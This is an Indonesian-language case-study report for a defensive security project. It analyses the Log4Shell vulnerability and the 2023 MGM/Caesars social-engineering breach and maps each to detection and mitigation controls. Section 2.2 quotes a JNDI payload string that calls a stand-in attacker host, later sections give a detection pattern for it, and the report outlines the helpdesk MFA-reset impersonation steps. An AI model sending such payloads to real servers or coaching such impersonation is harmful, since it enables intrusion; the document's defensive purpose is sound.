# Analisis Kasus Serangan Siber — Project Sentinel

---

## 1. Pendahuluan

Keamanan siber bukan sekadar teori, setiap hari perusahaan besar di seluruh dunia menjadi korban serangan yang canggih dan terencana. Dokumen ini menganalisis dua kasus nyata serangan siber yang menjadi referensi utama dalam pembangunan sistem keamanan Project Sentinel. Kedua kasus ini dipilih karena mencerminkan ancaman yang paling relevan dengan infrastruktur yang dibangun tim: eksploitasi kerentanan perangkat lunak (Log4Shell 2021) dan serangan berbasis manipulasi identitas (MGM/Caesars 2023). Analisis ini bukan sekadar ringkasan kejadian, melainkan pemetaan teknis yang menghubungkan setiap teknik serangan dengan solusi nyata yang diimplementasikan dalam Project Sentinel.

---

## 2. Kasus 1 - Log4Shell 2021 (CVE-2021-44228)

### 2.1 Timeline Kejadian

Log4Shell adalah salah satu kerentanan keamanan paling berbahaya dalam sejarah internet modern. Berikut adalah kronologi kejadiannya:

- **24 November 2021:** Peneliti keamanan dari Alibaba Cloud melaporkan kerentanan ini secara privat kepada Apache Foundation.
- **9 Desember 2021:** Kerentanan bocor ke publik sebelum patch resmi tersedia. Dalam hitungan jam, penyerang di seluruh dunia mulai mengeksploitasi celah ini secara masif.
- **10 Desember 2021:** Apache merilis patch darurat versi Log4j 2.15.0, namun patch ini ternyata masih belum sempurna.
- **13 Desember 2021:** Apache kembali merilis patch kedua versi 2.16.0 untuk menutup celah yang masih tersisa.
- **Desember 2021 - Januari 2022:** Jutaan server di seluruh dunia masih dalam kondisi rentan karena proses patching yang lambat. Penyerang terus mengeksploitasi celah ini untuk menanamkan malware, ransomware, dan cryptominer.

### 2.2 Mekanisme Eksploitasi - JNDI Lookup

Log4j adalah library (pustaka program) Java yang digunakan oleh jutaan aplikasi di seluruh dunia untuk mencatat aktivitas sistem (logging). Library ini sangat populer karena mudah digunakan dan tersedia secara gratis. Kerentanan Log4Shell terjadi karena Log4j memiliki fitur yang disebut JNDI Lookup (Java Naming and Directory Interface). Fitur ini seharusnya digunakan untuk mencari resource di jaringan internal, namun ternyata bisa disalahgunakan oleh penyerang.

Cara kerja eksploitasinya adalah sebagai berikut:

- **Langkah 1:** Penyerang mengirimkan HTTP request ke server target yang menggunakan Log4j. Request ini berisi string berbahaya seperti: `${jndi:ldap://server-penyerang.com/exploit}`
- **Langkah 2:** Log4j secara otomatis membaca dan memproses string tersebut karena mengira itu adalah perintah lookup yang sah.
- **Langkah 3:** Server target terhubung ke server milik penyerang dan mengunduh kode berbahaya secara otomatis.
- **Langkah 4:** Kode berbahaya dieksekusi di server target, memberikan penyerang kendali penuh atas sistem tersebut.

Yang membuat Log4Shell sangat berbahaya adalah string berbahaya ini bisa disisipkan di mana saja, di header HTTP, di kolom username, di kolom pencarian, bahkan di nama perangkat. Selama aplikasi mencatat input tersebut menggunakan Log4j, eksploitasi bisa berhasil.

### 2.3 Dampak Global

Dampak Log4Shell sangat masif dan meluas ke seluruh dunia:

- Lebih dari 3 miliar perangkat yang menggunakan Java berpotensi terdampak kerentanan ini.
- Perusahaan teknologi terbesar dunia terdampak, termasuk Apple, Amazon, Google, Microsoft, Twitter, dan Steam.
- Badan Keamanan Siber Amerika Serikat (CISA) menyebut Log4Shell sebagai "salah satu kerentanan paling serius yang pernah ada" dan mewajibkan semua lembaga pemerintah federal untuk segera melakukan patching.
- Kelompok peretas dari berbagai negara, termasuk kelompok yang diduga disponsori negara, memanfaatkan celah ini untuk menyerang infrastruktur kritis.
- Kerugian global ditaksir mencapai miliaran dolar akibat biaya patching, investigasi, dan pemulihan sistem.

### 2.4 Teknik Deteksi yang Seharusnya Diterapkan

Serangan Log4Shell sebenarnya dapat dideteksi lebih awal apabila organisasi memiliki sistem monitoring yang tepat:

- Monitor log web server secara real-time untuk mendeteksi string `${jndi:` pada HTTP request yang masuk. Kehadiran string ini di log adalah indikator serangan yang sangat jelas.
- Implementasi Web Application Firewall (WAF) yang mampu memblokir request dengan pola string berbahaya sebelum mencapai aplikasi.
- Network monitoring untuk mendeteksi koneksi keluar yang tidak biasa dari server internal ke alamat IP asing, terutama melalui protokol LDAP, RMI, atau DNS.
- File Integrity Monitoring untuk mendeteksi perubahan file sistem yang tidak terduga akibat eksekusi payload berbahaya.

### 2.5 Pemetaan MITRE ATT&CK

| Kode MITRE | Nama Teknik | Penjelasan |
|------------|-------------|------------|
| T1190 | Exploit Public-Facing Application | Penyerang mengeksploitasi kerentanan Log4j pada aplikasi yang terhubung ke internet |
| T1059 | Command and Scripting Interpreter | Penyerang menjalankan perintah berbahaya di server korban setelah eksploitasi berhasil |
| T1105 | Ingress Tool Transfer | Penyerang mengunduh tools tambahan ke server korban untuk memperluas serangan |

---

## 3. Kasus 2 - MGM Resorts & Caesars 2023

### 3.1 Latar Belakang

Pada September 2023, dua perusahaan kasino dan hotel terbesar di Amerika Serikat, MGM Resorts International dan Caesars Entertainment, menjadi korban serangan siber yang dilakukan oleh kelompok peretas bernama Scattered Spider. Serangan ini menjadi salah satu kasus kejahatan siber paling terkenal di tahun 2023 karena dampaknya yang sangat besar dan cara masuknya penyerang yang sangat tidak terduga.

### 3.2 Entry Point - Social Engineering via IT Helpdesk

Yang membuat kasus ini unik dan mengejutkan adalah cara penyerang masuk ke dalam sistem MGM. Mereka tidak menggunakan exploit teknis yang canggih atau kerentanan zero-day. Mereka cukup menelepon. Berikut adalah cara penyerang masuk:

- **Langkah 1:** Penyerang mencari informasi karyawan MGM di LinkedIn. Mereka menemukan nama dan jabatan karyawan yang memiliki akses tinggi ke sistem MGM.
- **Langkah 2:** Penyerang menelepon IT Helpdesk MGM dan berpura-pura menjadi karyawan tersebut yang sedang mengalami masalah dengan akunnya.
- **Langkah 3:** Dengan teknik social engineering yang meyakinkan, penyerang berhasil membujuk petugas IT Helpdesk untuk melakukan reset Multi-Factor Authentication (MFA) pada akun karyawan tersebut.
- **Langkah 4:** Setelah MFA direset, penyerang langsung masuk ke sistem MGM menggunakan kredensial yang valid. Dari sudut pandang sistem, ini terlihat seperti login normal dari karyawan yang sah.

Seluruh proses dari telepon hingga akses masuk hanya membutuhkan waktu kurang dari 10 menit.

### 3.3 Teknik Lateral Movement

Setelah berhasil masuk, penyerang tidak langsung melakukan serangan besar. Mereka bergerak perlahan dan hati-hati di dalam jaringan MGM:

- Menggunakan kredensial admin yang berhasil didapatkan untuk mengakses sistem lain di jaringan internal MGM.
- Bergerak dari satu sistem ke sistem lain (lateral movement) menggunakan protokol yang sah seperti RDP dan SMB sehingga tidak terlihat mencurigakan.
- Meningkatkan privilege akses secara bertahap hingga berhasil mendapatkan akses ke sistem infrastruktur kritis MGM, termasuk server Okta (sistem manajemen identitas) dan Microsoft Azure.
- Setelah mendapatkan akses penuh, penyerang mengaktifkan ransomware ALPHV/BlackCat yang mengenkripsi ribuan server MGM secara serentak.

### 3.4 Dampak Bisnis

Dampak serangan terhadap MGM Resorts sangat besar dan terasa langsung oleh tamu hotel:

- Mesin slot di seluruh kasino MGM berhenti berfungsi selama beberapa hari.
- Sistem check-in hotel lumpuh total, tamu harus check-in secara manual menggunakan kertas.
- Website dan aplikasi MGM tidak bisa diakses selama berhari-hari.
- Sistem pemesanan kamar hotel dan tiket pertunjukan tidak berfungsi.
- MGM Resorts mengalami kerugian finansial lebih dari 100 juta dolar akibat gangguan operasional dan biaya pemulihan.
- Caesars Entertainment yang juga diserang memilih untuk membayar tebusan sebesar 15 juta dolar kepada penyerang.

### 3.5 Pelajaran yang Dipetik

Kasus MGM dan Caesars memberikan beberapa pelajaran penting yang harus diterapkan oleh setiap organisasi:

- Verifikasi identitas yang ketat di IT Helpdesk adalah hal yang tidak bisa diabaikan. Petugas helpdesk harus memiliki prosedur verifikasi berlapis sebelum melakukan perubahan pada akun pengguna, terutama untuk reset MFA.
- Prinsip Least Privilege harus diterapkan secara konsisten. Jika akun yang dikompromikan hanya memiliki akses terbatas, penyerang tidak akan bisa bergerak bebas ke seluruh sistem.
- Deteksi perilaku anomali sangat penting. Login dari lokasi baru, login di jam yang tidak biasa, atau akses ke sistem yang tidak biasa diakses oleh akun tersebut harus segera memicu alert.
- Micro-segmentation jaringan dapat mencegah lateral movement. Jika setiap bagian jaringan terisolasi dengan baik, penyerang tidak bisa bergerak bebas meski sudah masuk ke dalam sistem.

### 3.6 Pemetaan MITRE ATT&CK

| Kode MITRE | Nama Teknik | Penjelasan |
|------------|-------------|------------|
| T1078 | Valid Accounts | Penyerang menggunakan kredensial akun yang sah setelah berhasil menipu IT Helpdesk untuk reset MFA |
| T1021 | Remote Services | Penyerang bergerak lateral menggunakan RDP dan SMB dengan kredensial valid yang sudah dikuasai |
| T1486 | Data Encrypted for Impact | Penyerang mengaktifkan ransomware ALPHV/BlackCat untuk mengenkripsi ribuan server MGM |

---

## 4. Keterkaitan dengan Project Sentinel

| Kasus | Teknik Serangan | MITRE | Solusi di Project Sentinel | Issue |
|-------|----------------|-------|---------------------------|-------|
| Log4Shell | Eksploitasi JNDI string di log web server | T1190 | Custom Wazuh rule yang mendeteksi string `${jndi:` pada HTTP access log | #24 |
| Log4Shell | Eksekusi perintah berbahaya di server | T1059 | Wazuh FIM mendeteksi perubahan file sistem akibat payload | #23 |
| MGM 2023 | Login admin dengan kredensial valid tapi perilaku mencurigakan | T1078 | Rule deteksi login admin di luar jam kerja 22:00-06:00 WIB | #25 |
| MGM 2023 | Lateral movement via RDP dan SMB | T1021 | Micro-segmentation VLAN pfSense memblokir pergerakan antar segmen | #13 |
| MGM 2023 | Tidak ada kontrol akses yang ketat | T1078 | IAM Policy dan Least Privilege diterapkan di semua endpoint | #08 |
| MGM 2023 | Ransomware mengenkripsi server | T1486 | Wazuh FIM mendeteksi perubahan massal file sebagai indikator ransomware | #23 |
| Keduanya | Tidak ada sistem deteksi real-time | - | SIEM Wazuh dengan dashboard real-time dan notifikasi Telegram otomatis | #11, #12 |

---

## 5. Kesimpulan

Analisis terhadap kasus Log4Shell 2021 dan MGM Resorts 2023 membuktikan bahwa ancaman siber modern tidak hanya datang dari eksploitasi teknis yang canggih, tetapi juga dari celah prosedural dan human error yang sering diabaikan. Log4Shell menunjukkan betapa berbahayanya kerentanan pada komponen perangkat lunak yang digunakan secara luas, sementara MGM 2023 membuktikan bahwa social engineering yang sederhana pun bisa menembus pertahanan perusahaan senilai miliaran dolar.

Project Sentinel dibangun dengan mengambil pelajaran langsung dari kedua kasus ini. Setiap komponen yang diimplementasikan, mulai dari SIEM Wazuh, micro-segmentation VLAN, honeypot, canary token, hingga IAM Policy, dirancang untuk menutup celah yang sama yang dieksploitasi oleh penyerang pada kedua kasus tersebut. Dengan demikian, Project Sentinel bukan hanya sebuah latihan akademis, melainkan sebuah implementasi nyata dari pelajaran pahit yang sudah dialami oleh perusahaan-perusahaan besar di dunia nyata.

---

## Referensi

1. National Vulnerability Database (NVD). CVE-2021-44228 Detail. https://nvd.nist.gov/vuln/detail/CVE-2021-44228
2. Apache Software Foundation. (2021). Apache Log4j Security Vulnerabilities. https://logging.apache.org/log4j/2.x/security.html
3. CISA. (2021). Apache Log4j Vulnerability Guidance. https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance
4. Reuters. (2023). MGM Resorts cyberattack cost the company $100 million.
5. MITRE ATT&CK Framework. https://attack.mitre.org